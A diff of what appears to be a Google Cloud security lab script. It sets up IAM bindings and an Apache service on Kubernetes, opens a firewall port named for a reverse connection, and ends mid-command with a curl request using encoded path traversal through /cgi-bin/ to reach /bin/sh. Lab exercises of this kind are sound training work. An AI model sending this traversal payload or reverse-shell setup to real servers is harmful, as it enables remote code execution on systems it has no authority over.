@@ -21,10 +21,10 @@ sleep 15
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
 
+export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")
+
 gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
-
-export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")
 ```
 
 ```
@@ -105,15 +105,20 @@ kubectl expose deployment apache-deployment \
 --protocol TCP \
 --port 80
 
+
 NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
 NODE_PORT=$(kubectl get service apache-test-service \
 -o jsonpath={.spec.ports[0].nodePort})
+```
 
+```
 gcloud compute firewall-rules create apache-test-service-fw \
 --allow tcp:${NODE_PORT}
 
+curl http://${NODE_IP}:${NODE_PORT}
+
+
 gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
-```
 ```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
 --path-as-is \
